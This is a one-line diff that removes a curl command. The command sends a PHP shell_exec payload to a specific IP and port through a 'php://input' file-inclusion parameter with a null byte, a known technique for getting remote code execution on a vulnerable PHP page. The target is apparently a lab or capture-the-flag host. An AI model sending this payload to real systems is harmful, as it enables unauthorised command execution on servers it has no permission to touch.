@@ -1,1 +1,0 @@
-curl -X POST --data "<?php echo shell_exec('id'); ?>" "http://103.152.242.172:20053/?page=php://input%00" -k -v
